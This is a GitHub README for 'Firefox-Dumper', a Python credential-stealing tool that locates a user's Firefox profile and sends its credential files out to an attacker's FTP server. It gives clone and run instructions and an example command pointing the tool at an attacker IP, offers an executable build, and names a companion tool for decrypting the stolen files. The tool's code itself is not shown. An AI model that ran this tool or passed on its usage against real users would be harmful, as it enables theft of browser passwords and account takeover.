# Firefox-Dumper

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M03Q2JN)

<p align="center">
  <img src="https://github.com/dievus/Firefox-Dumper/blob/main/images/firefox_dumper.png" />
</p>

Firefox Dumper identifies the current user's Firefox profile directory and exfiltrates the credential files to the attacker's FTP server.  

## Usage
Installing Firefox Dumper

```git clone https://github.com/dievus/Firefox-Dumper.git```

Change directories to Firefox-Dumper and that's it.

```python3 firefoxdumper.py -h```

This will output the help menu, which contains the following flags:

```-h, --help - Lists the help options```

```-i, --ip - Mandatory - declares the attacker's FTP server IP. Firefox Dumper uses port 21 by default and is hardcoded.```

Examples of full commands include:

```python3 firefoxdumper.py -i 192.168.1.1```

### Executable Version

Check releases for the executable version. Note that it has to be ran from a command line with the -i flag.  

### Notes
A tool called "Firefox Decrypt" can be found here - https://github.com/unode/firefox_decrypt.  This tool is required in order to decrypt the files.  



